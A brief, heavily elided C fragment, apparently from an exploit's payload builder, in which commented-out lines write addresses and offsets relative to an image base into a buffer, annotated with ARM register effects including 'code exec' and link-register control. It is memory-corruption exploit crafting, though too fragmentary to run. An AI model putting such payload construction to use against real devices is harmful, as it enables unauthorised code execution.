...
if (1) {
    ...
    switch (seq) {
        ...
        case 2:
            ...
            //PUT_DWORD_LE(buffer, 78,  (uintptr_t)image + 0x47B68);                      /* *r2 = r4 */        [1]
            //PUT_DWORD_LE(buffer, 0x47B68 + 4 - 0x47B54, (NODE_SIZE + 0x40) >> 6);       /* *(r0 + 4) = r9 */  [2]
            //PUT_DWORD_LE(buffer, 0x47B68 + 0x40 - 0x47B54, (uintptr_t)image + 0x47BB1); /* r10 (code exec) */ [3]
            //PUT_DWORD_LE(buffer, 0x47B68 + 0x44 - 0x47B54, (uintptr_t)image + 0x47cb4); /* r11 -> lr */       [4]
